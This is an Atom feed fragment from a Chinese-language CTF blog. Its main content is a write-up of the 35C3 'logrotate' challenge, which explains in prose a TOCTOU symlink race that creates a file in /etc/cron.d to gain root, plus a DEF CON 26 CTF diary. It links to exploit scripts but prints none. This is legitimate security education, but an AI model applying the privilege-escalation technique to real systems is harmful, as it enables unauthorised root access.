再送 &lt;code&gt;flag&lt;/code&gt; (or &lt;code&gt;flag.glksave&lt;/code&gt;) 才會是正確的檔名  &lt;/p&gt;
&lt;h2&gt;Note&lt;/h2&gt;
&lt;p&gt;其實發現 pickle 不能喝有一段時間&lt;br&gt;
但我竟然沒有馬上意識到漏洞有相關...Orz&lt;br&gt;
也沒有馬上提出來討論&lt;br&gt;
不然可能可以省下 2 hr 的找漏洞時間來寫 exploit&lt;br&gt;
絕對是戰犯無誤 QQ&lt;br&gt;
還好沒有錯失 DEFCON 的資格...  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;PCTF{pWn_4dv3ntUrE_IF_3d1ti0n}&lt;/code&gt;&lt;br&gt;
exploit: &lt;a href="https://ddaa.tw/exp/plaid-adventure-ii.py"&gt;plaid-adventure-ii.py&lt;/a&gt;  &lt;/p&gt;</content><category term="PlaidCTF"></category><category term="Out-of-bound"></category></entry><entry><title>35C3CTF 2018 zajebiste 290 logrotate</title><link href="https://ddaa.tw/35c3ctf_2018_zajebiste_290_logrotate.html" rel="alternate"></link><published>2019-01-09T20:23:00+08:00</published><updated>2019-01-09T20:23:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2019-01-09:/35c3ctf_2018_zajebiste_290_logrotate.html</id><summary type="html">&lt;p&gt;35C3 今年的題目也是超難 = =&lt;br&gt;
各種 browser 和 sandbox escape 題&lt;br&gt;
現在的 CTF 真的越來越 real world 啦&lt;br&gt;
BTW，&lt;code&gt;zajebiste&lt;/code&gt; 的分類聽說就是 zero day 的意思 XD  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;在星期五還在上班的時候，有人就敲我說有 &lt;code&gt;logrotate&lt;/code&gt; 這題  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;有 log 題欸 你不是 log 大王嗎  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ok, challenge accepted. = =+&lt;br&gt;
結果從星期五晚上開始看，一直到星期六晚上才想到作法 QQ&lt;br&gt;
(雖然中間去幫忙看了一下 &lt;code&gt;collection&lt;/code&gt;)  &lt;/p&gt;
&lt;p&gt;簡單介紹一下這題的環境&lt;br&gt;
nc 連上通過 pow 的考驗之後&lt;br&gt;
會初始化一個 docker container 然後進入 chroot&lt;br&gt;
得到的權限會是 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;35C3 今年的題目也是超難 = =&lt;br&gt;
各種 browser 和 sandbox escape 題&lt;br&gt;
現在的 CTF 真的越來越 real world 啦&lt;br&gt;
BTW，&lt;code&gt;zajebiste&lt;/code&gt; 的分類聽說就是 zero day 的意思 XD  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;在星期五還在上班的時候，有人就敲我說有 &lt;code&gt;logrotate&lt;/code&gt; 這題  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;有 log 題欸 你不是 log 大王嗎  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ok, challenge accepted. = =+&lt;br&gt;
結果從星期五晚上開始看，一直到星期六晚上才想到作法 QQ&lt;br&gt;
(雖然中間去幫忙看了一下 &lt;code&gt;collection&lt;/code&gt;)  &lt;/p&gt;
&lt;p&gt;簡單介紹一下這題的環境&lt;br&gt;
nc 連上通過 pow 的考驗之後&lt;br&gt;
會初始化一個 docker container 然後進入 chroot&lt;br&gt;
得到的權限會是 &lt;code&gt;uid=1000(user) gid=1000(user) groups=1000(user),0(root)&lt;/code&gt;&lt;br&gt;
要想辦法讀到只有 root 可以存取的 &lt;code&gt;/flag&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;一開始想嘗試直接 escape chroot 的限制，不過失敗了 QQ&lt;br&gt;
原因應該是 debain 不允許非 root 去 ptrace 別人的 process&lt;br&gt;
只好認真看題目的結構&lt;br&gt;
題目給了一個 setuid 的 binary &lt;code&gt;run_cron&lt;/code&gt;&lt;br&gt;
允許我們以 root 的權限觸發 logrotate&lt;br&gt;
同時故意放了一個有問題的設定檔 &lt;code&gt;/etc/logrotate.d/pwnme&lt;/code&gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/tmp/log/pwnme.log {
    daily
    rotate 12
    missing ok
    notifempty
    size 1K
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;嘗試自行建立 &lt;code&gt;/tmp/log/pwmne.log&lt;/code&gt;&lt;br&gt;
(&lt;code&gt;/tmp/log&lt;/code&gt; 的權限必須是 700 否則會噴 error)&lt;br&gt;
可以成功觸發 logrotate&lt;br&gt;
但要如何利用呢...?  &lt;/p&gt;
&lt;p&gt;第一個直覺就是 symbolic link 會出問題 XD&lt;br&gt;
嘗試了一下...什麼時都沒發生&lt;br&gt;
開 debug mode 來看可以得知原因是有 symlink 做檢查  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;log /tmp/log/pwnme.log is symbolic link. Rotation of symbolic links is not allowed to avoid security issues -- skipping.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;1125     if ((sb.st_mode &amp;amp; S_IFMT) == S_IFLNK) {
1126         message(MESS_DEBUG, &amp;quot;  log %s is symbolic link. Rotation of symbolic&amp;quot;
1127             &amp;quot; links is not allowed to avoid security issues -- skipping.\n&amp;quot;,
1128             log-&amp;gt;files[logNum]);
1129         return 0;
1130     }
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;但顯然存在 &lt;a href="https://cwe.mitre.org/data/definitions/367.html"&gt;TOCTOU&lt;/a&gt; 的問題&lt;br&gt;
只要透過 while loop 不斷的讓 pwnme.log 在 symlink 和 normal file 之間切換&lt;br&gt;
就有機會 bypass 掉這個檢查&lt;br&gt;
但因為題目給的 logrotate 設定檔只是單純把 log 做 &lt;code&gt;rename&lt;/code&gt;&lt;br&gt;
因此完全沒有用...XDD&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ls -l&lt;br&gt;
total 0&lt;br&gt;
lrwxrwxrwx 1 user user 11 Jan  8 09:25 pwnme.log.1 -&amp;gt; /etc/passwd  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;雖然沒有用，不過這帶給我一個思路是：&lt;br&gt;
&lt;strong&gt;logrotate 其他地方會不會也存在 TOCTOU 的問題呢 ?&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;因此就開始了 logrotate 的 code review 之路&lt;br&gt;
BTW，比賽環境使用的版本是 3.11.0&lt;br&gt;
比賽過程有稍微走錯路去確認是不是考 CVE issue&lt;br&gt;
後來才發現原來 CentOS 9 現行的版本就是 3.11.0 ... Orz  &lt;/p&gt;
&lt;p&gt;code review 完發現還有一個地方 "乍看之下" 有類似的問題&lt;br&gt;
在 logrotate 設定檔包含 &lt;code&gt;create&lt;/code&gt; 的情況&lt;br&gt;
最後會呼叫 &lt;code&gt;createOutputFile&lt;/code&gt; 產生目前最新的 log 檔案&lt;br&gt;
&lt;code&gt;createOutputFile&lt;/code&gt; 會先檢查目前 output 的位置是否存在檔案&lt;br&gt;
如果存在會強制 rename 成 &lt;code&gt;filename-%Y%m%d%H.backup&lt;/code&gt;&lt;br&gt;
(重試兩次，兩次都失敗會放棄建立檔案)&lt;br&gt;
然後用 &lt;code&gt;fchmod&lt;/code&gt; 將檔案改成原本 log 的權限  &lt;/p&gt;
&lt;p&gt;原本看到這個想法是，一樣透過 race condition 的方式&lt;br&gt;
如果能在更改權限的時候觸發到，就可以把 &lt;code&gt;/flag&lt;/code&gt; 的權限改成 user&lt;br&gt;
仔細思考之後是不可能做得到的&lt;br&gt;
因為這邊用的是 &lt;code&gt;open&lt;/code&gt; + &lt;code&gt;fchmod&lt;/code&gt; 而不是 &lt;code&gt;stat&lt;/code&gt; + &lt;code&gt;chmod&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;後來又想是不是可以在 &lt;code&gt;rename&lt;/code&gt; 的過程中做到 race condition ?&lt;br&gt;
但據我了解 &lt;code&gt;rename&lt;/code&gt; 會是由 &lt;a href="https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/rename.c.html"&gt;syscall&lt;/a&gt; 來完成&lt;br&gt;
算是 atomic 的操作，不太可能達成&lt;br&gt;
只好思索其他的方式  &lt;/p&gt;
&lt;p&gt;最後發現問題還是出在 &lt;code&gt;createOutputFile&lt;/code&gt; 身上&lt;br&gt;
用 verbose mode 可以得知完整的 logrotate 的流程會是：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;renaming /tmp/log/pwnme.log.12 to /tmp/log/pwnme.log.13 (rotatecount 12, logstart 1, i 12),
renaming /tmp/log/pwnme.log.11 to /tmp/log/pwnme.log.12 (rotatecount 12, logstart 1, i 11),
renaming /tmp/log/pwnme.log.10 to /tmp/log/pwnme.log.11 (rotatecount 12, logstart 1, i 10),
renaming /tmp/log/pwnme.log.9 to /tmp/log/pwnme.log.10 (rotatecount 12, logstart 1, i 9),
renaming /tmp/log/pwnme.log.8 to /tmp/log/pwnme.log.9 (rotatecount 12, logstart 1, i 8),
renaming /tmp/log/pwnme.log.7 to /tmp/log/pwnme.log.8 (rotatecount 12, logstart 1, i 7),
renaming /tmp/log/pwnme.log.6 to /tmp/log/pwnme.log.7 (rotatecount 12, logstart 1, i 6),
renaming /tmp/log/pwnme.log.5 to /tmp/log/pwnme.log.6 (rotatecount 12, logstart 1, i 5),
renaming /tmp/log/pwnme.log.4 to /tmp/log/pwnme.log.5 (rotatecount 12, logstart 1, i 4),
renaming /tmp/log/pwnme.log.3 to /tmp/log/pwnme.log.4 (rotatecount 12, logstart 1, i 3),
renaming /tmp/log/pwnme.log.2 to /tmp/log/pwnme.log.3 (rotatecount 12, logstart 1, i 2),
renaming /tmp/log/pwnme.log.1 to /tmp/log/pwnme.log.2 (rotatecount 12, logstart 1, i 1),
renaming /tmp/log/pwnme.log.0 to /tmp/log/pwnme.log.1 (rotatecount 12, logstart 1, i 0),
old log /tmp/log/pwnme.log.0 does not exist
renaming /tmp/log/pwnme.log to /tmp/log/pwnme.log.1
creating new /tmp/log/pwnme.log mode = 0644 uid = 1000 gid = 1000
removing old log /tmp/log/pwnme.log.13
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;在 &lt;code&gt;findNeedRotating&lt;/code&gt; 執行完之後 (也就是前面檢查 folder 700 和 symlink 的地方)&lt;br&gt;
就不會再對 log 的儲存位置做檢查了&lt;br&gt;
後面會用 rename 進行 logrotate，但如前述應該沒辦法利用&lt;br&gt;
最後 creating 時會用 &lt;code&gt;open&lt;/code&gt; 創建新的檔案&lt;br&gt;
在這之前沒有再進行一次路徑檢查，也存在 TOCTOU 的問題&lt;br&gt;
因此有機會透過 symlink race codition 的方式&lt;br&gt;
達成在任意路徑創造出可讀寫的 &lt;code&gt;pwnme.log&lt;/code&gt; 檔案  &lt;/p&gt;
&lt;p&gt;由於有 &lt;code&gt;run_cron&lt;/code&gt; 的存在，我選擇建 symlink 的目標是 &lt;code&gt;/etc/cron.d&lt;/code&gt;&lt;br&gt;
&lt;code&gt;run_cron&lt;/code&gt; 做的事情其實是 &lt;code&gt;execl("/bin/run-parts", "run-parts", "--regex", ".*", "/etc/cron.d", NULL);&lt;/code&gt;&lt;br&gt;
成功將 symlink 建成 &lt;code&gt;/etc/cron.d&lt;/code&gt; 後&lt;br&gt;
透過編輯 &lt;code&gt;/etc/cron.d/pwnme.log&lt;/code&gt; 就可以以 root 執行任意指令  &lt;/p&gt;
&lt;p&gt;剩下的問題就是如何剛好在 call &lt;code&gt;open&lt;/code&gt; 的時候達成 race condition 了&lt;br&gt;
一開始單純用 while loop 切換 symlink 和 folder&lt;br&gt;
但跑了幾萬輪之後還是沒有成功...Orz&lt;br&gt;
後來做了些修改，多跑了一個 while loop 重複 &lt;code&gt;touch /tmp/log/pwnme.log&lt;/code&gt;&lt;br&gt;
前面有提到 &lt;code&gt;createOutputFile&lt;/code&gt; 會在 log 存在時進行備份&lt;br&gt;
利用這個行為增加 race condition 成功的機會&lt;br&gt;
最後大約放著跑了一個小時後&lt;br&gt;
成功拿到建立 &lt;code&gt;/etc/cron.d/pwnme.log&lt;/code&gt; 並拿到 root shell  &lt;/p&gt;
&lt;p&gt;這題雖然分類在 &lt;code&gt;zajebiste&lt;/code&gt; 底下&lt;br&gt;
除了有問題的設定檔，的確也幾乎是 real world 的環境配置&lt;br&gt;
但實際上發生問題的機率實在是太低了 = =&lt;br&gt;
這題如果沒有辦法用 while loop 去重複執行 &lt;code&gt;run_cron&lt;/code&gt; 根本沒辦法觸發問題...囧rz&lt;br&gt;
我猜也是因為這樣出題者才懶得回報問題吧 (茶  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;35C3_rotating_as_intended&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;exploit: &lt;a href="https://ddaa.tw/exp/logrotate.sh"&gt;exp.sh&lt;/a&gt;&lt;/p&gt;</content><category term="3XC3CTF"></category><category term="Bash"></category><category term="Race Condition"></category></entry><entry><title>DEF CON 26 CTF Final summary</title><link href="https://ddaa.tw/defcon_26_other_summary.html" rel="alternate"></link><published>2018-08-18T02:22:00+08:00</published><updated>2018-08-18T02:22:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2018-08-18:/defcon_26_other_summary.html</id><summary type="html">&lt;p&gt;稍微紀錄一下 DEF CON 26 CTF 這幾天的事情...&lt;br&gt;
有些情況是睡醒之後聽大家轉述的，如果有誤還麻煩指證 XD&lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;Day 0&lt;/h2&gt;
&lt;p&gt;趕工封包分析工具，寫出各種 bug ... 早知道前幾天就少玩一點 switch 了 XD&lt;/p&gt;
&lt;p&gt;其中最麻煩的 bug 是發現封包如果時間非常接近時有 race condition 的問題，先發生的測試會被覆寫成同一次結果，搞東搞西弄到早上快五點才讓工具能正常工作 Orz&lt;/p&gt;
&lt;p&gt;&lt;img alt="switch.jpg" src="https://ddaa.tw/images/defcon_26_switch.jpg"&gt;&lt;/p&gt;
&lt;h2&gt;Day 1&lt;/h2&gt;
&lt;p&gt;唯一下去會場的一天，一開始現場網路大爆炸，對外網路 1800ms 的延遲 XDD 比賽延後一小時開始，預料之內的因為主辦方更換，規則也跟著有所變動：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Attack &amp;amp; Defense 的算分不再是零和制&lt;/li&gt;
&lt;li&gt;Attack point 打多少隊伍就得多少分&lt;/li&gt;
&lt;li&gt;Defense point 有成功擋住攻擊會獲得分數&lt;ul&gt;
&lt;li&gt;不太確定到底是怎麼判斷成功防禦，主辦方到第三天才把分數算對...應該算對了吧 …&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;稍微紀錄一下 DEF CON 26 CTF 這幾天的事情...&lt;br&gt;
有些情況是睡醒之後聽大家轉述的，如果有誤還麻煩指證 XD&lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;Day 0&lt;/h2&gt;
&lt;p&gt;趕工封包分析工具，寫出各種 bug ... 早知道前幾天就少玩一點 switch 了 XD&lt;/p&gt;
&lt;p&gt;其中最麻煩的 bug 是發現封包如果時間非常接近時有 race condition 的問題，先發生的測試會被覆寫成同一次結果，搞東搞西弄到早上快五點才讓工具能正常工作 Orz&lt;/p&gt;
&lt;p&gt;&lt;img alt="switch.jpg" src="https://ddaa.tw/images/defcon_26_switch.jpg"&gt;&lt;/p&gt;
&lt;h2&gt;Day 1&lt;/h2&gt;
&lt;p&gt;唯一下去會場的一天，一開始現場網路大爆炸，對外網路 1800ms 的延遲 XDD 比賽延後一小時開始，預料之內的因為主辦方更換，規則也跟著有所變動：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Attack &amp;amp; Defense 的算分不再是零和制&lt;/li&gt;
&lt;li&gt;Attack point 打多少隊伍就得多少分&lt;/li&gt;
&lt;li&gt;Defense point 有成功擋住攻擊會獲得分數&lt;ul&gt;
&lt;li&gt;不太確定到底是怎麼判斷成功防禦，主辦方到第三天才把分數算對...應該算對了吧?&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;除了 A&amp;amp;D 以外也同時有 King of the Hill 的題目，前五名就會分別獲得 10, 6, 3, 2, 1 分&lt;ul&gt;
&lt;li&gt;個人覺得這樣的配分比較理想，大家不會因為第一名領先太多而放棄 KoH 的題目。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;禁止 access 到 gamebox，也不能連到其他隊伍的網路&lt;/li&gt;
&lt;li&gt;每題隨著 exploit 的數量而有不同的狀態，由好到壞的順序是 &lt;strong&gt;GOOD&lt;/strong&gt;-&amp;gt; &lt;strong&gt;LOW&lt;/strong&gt; -&amp;gt; &lt;strong&gt;BAD&lt;/strong&gt; -&amp;gt; &lt;strong&gt;INACTIVE&lt;/strong&gt;，變成 &lt;strong&gt;INACTIVE&lt;/strong&gt; 就不能再打了&lt;ul&gt;
&lt;li&gt;大家可以根據題目的狀態評估這題的投資報酬率，個人覺得這個設計還不錯&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="status.png" src="https://ddaa.tw/images/defcon_26_status.png"&gt;&lt;/p&gt;
&lt;p&gt;原本要寫自動抓 pcap 並根據 service 分割後分類保存的 script，結果今年規則 pcap 會到 service 快被打爛才給......XDD 頓時沒事情做，同時宣告昨晚的封包分析工具幾乎做白工了 = = BTW，後來 lsc 抽空把 script 寫完了 &amp;lt;(_ _)&amp;gt; 大家讀完規則心情都不太美麗，因為之前趕工的 tool 幾乎沒有用武之地了 Q__Q&lt;/p&gt;
&lt;p&gt;取得 pcap 的管道是從 web 頁面下載，不像往年是從 sftp 下載，用 web 我是沒意見，但為什麼不另外做一頁來讓大家載 pcap = =&lt;/p&gt;
&lt;p&gt;&lt;img alt="pcap.png" src="https://ddaa.tw/images/defcon_26_pcap.png"&gt;&lt;/p&gt;
&lt;p&gt;開賽後放出一道 KoH 的題目 &lt;code&gt;reverse&lt;/code&gt;，下載 binary 執行後發現是一個 cloze 問答遊戲，題目會將 assembly 的片段挖空，要從選項回答正確的答案，但後來發現選項有重複甚至根本答案是錯的...= = 嘗試 reverse 並 patch 程式，但 server 端有檢查數據而行不通。&lt;/p&gt;
&lt;p&gt;後來大致可分兩組人馬用不同方式解這題：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Parse output 組 (sean &amp;amp; david942j)&lt;/li&gt;
&lt;li&gt;Reverse protocol 組 (lays &amp;amp; jery 和樓上其他人?)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我嘗試用 gdbscript hook 處理 output 的 function，再 parse 題目自動解題，但後來發現進度落後其他人，就沒有繼續嘗試了。&lt;/p&gt;
&lt;p&gt;下午放出新題 &lt;code&gt;pointless&lt;/code&gt;，binary 是 mips 的架構，連上去之後得到了一些 base64 的字串，解回來是一個很大的數字，初步猜測是 crypto 相關的題目。&lt;/p&gt;
&lt;p&gt;原本想丟到 &lt;a href="https://retdec.com/"&gt;RetDec&lt;/a&gt; 做 decompile，但發現 online service 已經關了，改成 open source 讓大家自己用工具處理，裝了一下 ida plugin 覺得難用，就倚賴 orange 和 jery 幫忙 decompile，一開始解出的 code 有幾十萬行...根本不能看 = =，後來把 gmpz 的 library 餵進去之後，剩下 4000 餘行，大家比較能開始找洞在哪。&lt;/p&gt;
&lt;p&gt;待到下午四點左右實在撐不住了，先回樓上睡覺，睡醒得知有放兩道新題 &lt;code&gt;doublethink&lt;/code&gt; 和 &lt;code&gt;twoplustwo&lt;/code&gt;，jery 已經發現 &lt;code&gt;pointless&lt;/code&gt; 一個 &lt;code&gt;memcpy&lt;/code&gt; 的漏洞，但因為前面的 crypto 沒辦法解，所以還是不能串整個 exploit，大家跟 lyc12345 遠端討論了一下 RSA 要如何破，但因為飯店網路有問題沒辦法好好的寫 code 測試。&lt;/p&gt;
&lt;p&gt;DEFKOR00T 打出 &lt;code&gt;twoplustwo&lt;/code&gt; 的 firstblood，david942j 有發現漏洞但是還沒辦法成功利用。  &lt;/p&gt;
&lt;p&gt;PPP 已經成功打出 &lt;code&gt;pointless&lt;/code&gt; 的 firstblood，據說得知主辦方出包跑的題目是 x64 的版本，也因為這樣我們猜測一定還有一個能讀 flag 的邏輯洞，否則 PPP 不太可能成功打下 XD&lt;/p&gt;
&lt;p&gt;晚餐時間發生了小插曲，要用 ubereat 定麥當勞當晚餐，angelboy 原本想訂麥克雞塊套餐，結果點到快樂兒童餐，而且有一票人喊 +1，大家因此得到了好幾個 Mario Odyssey 的玩具 XDDD&lt;/p&gt;
&lt;p&gt;&lt;img alt="mcdonalds.jpg" src="https://ddaa.tw/images/defcon_26_mcdonalds.jpg"&gt;&lt;/p&gt;
&lt;h2&gt;Day 2&lt;/h2&gt;
&lt;p&gt;晚上大家分成三組解 &lt;code&gt;pointless&lt;/code&gt;、&lt;code&gt;twoplustwo&lt;/code&gt; 和 &lt;code&gt;doublethink&lt;/code&gt;，&lt;code&gt;pointless&lt;/code&gt; 看一陣子之後覺得幫不上忙，決定改去解 &lt;code&gt;doublethink&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;doublethink&lt;/code&gt; 也是 KoH 的題目，規則是上傳一份 shellcode，能同時跑在越多架構上則獲得越高分，一共有 14 個平台，分成 present, past, future 三類：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;past&lt;ul&gt;
&lt;li&gt;lgp-30&lt;/li&gt;
&lt;li&gt;pdp-1, pdp-8, pdp-10&lt;/li&gt;
&lt;li&gt;mix&lt;/li&gt;
&lt;li&gt;ibm-1401&lt;/li&gt;
&lt;li&gt;nova&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;present&lt;ul&gt;
&lt;li&gt;amd64&lt;/li&gt;
&lt;li&gt;arm64&lt;/li&gt;
&lt;li&gt;mipsel&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;future&lt;ul&gt;
&lt;li&gt;risc-v&lt;/li&gt;
&lt;li&gt;hexagon&lt;/li&gt;
&lt;li&gt;mmix&lt;/li&gt;
&lt;li&gt;clemency&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;雖然有 14 個平台，但 present 只能選一個來跑，因此理論上最多可以拿到 12 分。&lt;/p&gt;
&lt;p&gt;review 完主辦方給的環境後，發現每次 shellcode 在執行的環境沒有互相隔離，amd64 拿來跑 shellcode 的 binary 也沒有任何的防護，推測是可以拿 shell 來做一些壞事，但因為有降權成 &lt;code&gt;nobody&lt;/code&gt;，一開始沒有看到什麼明顯的問題。&lt;/p&gt;
&lt;p&gt;後來 jeffxx 發現 past 系列都會將 instruction pipe 給 simulator 執行，推測這邊有 race condition 的問題，可以 hijack fd 來影響 output，摸索了一陣子成功做出 POC，證明 jeffxx 的猜測正確。&lt;/p&gt;
&lt;p&gt;最後分的 exploit 分成三個人完成：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;sean 負責串 present 和 future 的 polyglot shellcode，成功串了 &lt;code&gt;amd64&lt;/code&gt;+&lt;code&gt;risc-v&lt;/code&gt;+&lt;code&gt;hexagon&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;jeffxx 將 POC 改寫成可以穩定觸發 race condition 的 shellscript&lt;/li&gt;
&lt;li&gt;我負責把 POC 寫成不需要透過 reverse shell 就能執行 shell script 的版本&lt;ul&gt;
&lt;li&gt;有過今年 SECCON final 前車之鑑，現在寫 exploit 都盡可能寫成不需要 reverse shell 的版本，後來證明改寫是必要的...&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;因為沒注意到 service.py 會執行 killall 的問題，debug 很久才確認沒辦法跑一份 shellscript 就 hijack 全部 past 架構，完成時已經接近早上八點吃早餐的時間了，BTW，優等生 twoplustwo 組很早就完成 exploit 然後先去睡了，羨慕阿~~&lt;/p&gt;
&lt;p&gt;隔天開賽主辦方又出包了...XD，A&amp;amp;D 推遲到中午才開始，KoH 早一點，11 點就可以開打，昨晚精心撰寫的 exp 成功的打下了 11 個平台...才怪，一開始沒有成功打出 exploit，只能眼看著 Dragon Sector 成功打出 9 個 exploit Orz&lt;/p&gt;
&lt;p&gt;如昨晚預期的可能沒有 reverse shell 可以用，暗自慶幸有熬夜改寫成寫檔的版本，但寫檔的版本也沒有成功打下 11 個平台...。&lt;/p&gt;
&lt;p&gt;原本以為是主辦方的環境有禁止寫檔，要改寫成純 assembly 的版本，但越想越不對勁，於是先用 open+write 再用 sendfile 確認寫檔是否能成功，結論是有成功寫檔，但是一直噴出重複的內容，猜測是重複執行寫檔了，至今還是不曉得為什麼會造成這種情況...由於寫檔會一直 loop，可想而知 shellscript 的內容也重複了，正在思考如何改寫時，bruce30262 神來一筆說直接在最後插 &lt;code&gt;exit&lt;/code&gt; 就好了，真是睿智 XD&lt;/p&gt;
&lt;p&gt;在經歷一番波折後成功的打下了 11 個平台，一開始主辦方不知道為何沒吃到紀錄...，打了第二次才成功將記錄更新，話說因為最後 exploit 要各平台手動執行，在打名稱時手都抖抖的很怕自己打錯就要重來了 XDDD&lt;/p&gt;
&lt;p&gt;&lt;img alt="doublethink_rank.jpg" src="https://ddaa.tw/images/defcon_26_doublethink_rank.jpg"&gt;&lt;/p&gt;
&lt;p&gt;同時 A&amp;amp;D 的狀況似乎不太樂觀，&lt;code&gt;pointless&lt;/code&gt; 因為 mips 跑得太慢，攻擊很容易打不成功，而 &lt;code&gt;twoplustwo&lt;/code&gt; 因為洞太簡單，大部分的隊伍已經補上，也沒有成功拿到多少分數......，確認 &lt;code&gt;doublethink&lt;/code&gt; 穩定拿分，而且 sean 暫時沒有想串 clememcy 的念頭我就先去睡了。&lt;/p&gt;
&lt;p&gt;睡覺的途中放了新題 &lt;code&gt;oooeditor&lt;/code&gt; 和 &lt;code&gt;poool&lt;/code&gt;，&lt;code&gt;oooeditor&lt;/code&gt; 在我還神志不清的時候大家就解掉了 &amp;lt;(_ _)&amp;gt; 沒多久 &lt;code&gt;oooeditor&lt;/code&gt; 的洞幾乎全世界都補上，主辦方放出 pcap 時根本沒用了 = = 這題的狀態也很快就變成 &lt;strong&gt;INACTIVE&lt;/strong&gt;，大概是壽命最短暫的一題了，&lt;code&gt;poool&lt;/code&gt; 是關於 blockchain 的題目，這領域我不太拿手，打開稍微看一下就沒繼續深追了，沒多久 DEFKOR00T 成功打出了 firstblood ... 由衷佩服他們挖掘漏洞的速度 Orz&lt;/p&gt;
&lt;p&gt;沒多久又放了新題 &lt;code&gt;bew&lt;/code&gt;，是由 node.js 架設的 web 服務，能 patch 的檔案是 web assembly，建設 docker 時發現 npm 有噴 &lt;code&gt;express-validator&lt;/code&gt; 這個套件的 security issue，但看了一下是用來做 DoS 的，估計是沒什麼用，我們還在傻傻的看 wasm 的時候，orange 成功黑箱踹出可以 js injection，沒多久就成功拿到 flag，可惜 PwnThyBytes 更早了一些，沒成功拿到 firstblood QQ。由於這題的 payload 會直接被記在 web 的某個頁面上，這題大家很快就打得滿天飛了，大家研究了很久該如何 patch，最後發現 wasm 裡面的 &lt;code&gt;eval&lt;/code&gt; 不是觸發 injection 的點，orange 寫了一個簡易的 waf 阻止被攻擊，貌似有成功防禦當時大家的 payload ... 但後來他自己想到繞過的方式了 XDD&lt;/p&gt;
&lt;p&gt;&lt;img alt="bew.png" src="https://ddaa.tw/images/defcon_26_bew.png"&gt;&lt;/p&gt;
&lt;p&gt;第二天結束前放了新題 &lt;code&gt;vchat&lt;/code&gt;，另外由於開賽 delay，第二天延到 21:00 才結束，主辦方宣布了一些事項，其中比較重要的是他們發現 Defense point 有算錯，明天會將修正後的分數公佈，在等待晚餐到來之際，手機陸續收到了沙塵暴和大洪水的災難通知 XDDD，只能感謝 turkey 和 alan 在這種天氣下幫我們張羅晚餐 &amp;lt;(_ _)&amp;gt;，晚餐是好吃的中式餐館，可以排名今年來 Les Vegas 前三好吃的食物 XD。&lt;/p&gt;
&lt;h2&gt;Day 3&lt;/h2&gt;
&lt;p&gt;晚上也是分成三組在看題目，分別是 &lt;code&gt;poool&lt;/code&gt;、&lt;code&gt;bew&lt;/code&gt; 和 &lt;code&gt;vchat&lt;/code&gt;，考慮了一下決定看新題 &lt;code&gt;vchat&lt;/code&gt;，投資報酬率應該會比較高(後來證明大錯特錯...)。&lt;/p&gt;
&lt;p&gt;題目給了兩個檔案 &lt;code&gt;vchat&lt;/code&gt; 和 &lt;code&gt;vbot&lt;/code&gt;，前者只是一個 shellscript 來執行 &lt;code&gt;vbot&lt;/code&gt;，後者是一個 binary，觀察了一陣行為得知是 xmpp 協定的 client，嘗試裝了各種 open source 的 server 都沒辦法好好的跟 &lt;code&gt;vbot&lt;/code&gt; 互動，後來在 jeffxx 神一樣的通靈之下，理解到原來 &lt;code&gt;vbot&lt;/code&gt; 會以 anonymous 的身分登入，因此要讓 &lt;code&gt;vbot&lt;/code&gt; 主動跟我們的 client 聯繫，我們才有辦法得知 id 並傳送指令，至此已經接近凌晨 3 點了...。&lt;/p&gt;
&lt;p&gt;接著分頭進行逆向和撰寫 client，但竟然找不到一個文件齊全的 library 使用，一直卡在 anonymous 認證這邊不曉得怎麼處理，後來 jeffxx 跟 meh 決定直接用題目用的 gloox 來寫 client XD&lt;/p&gt;
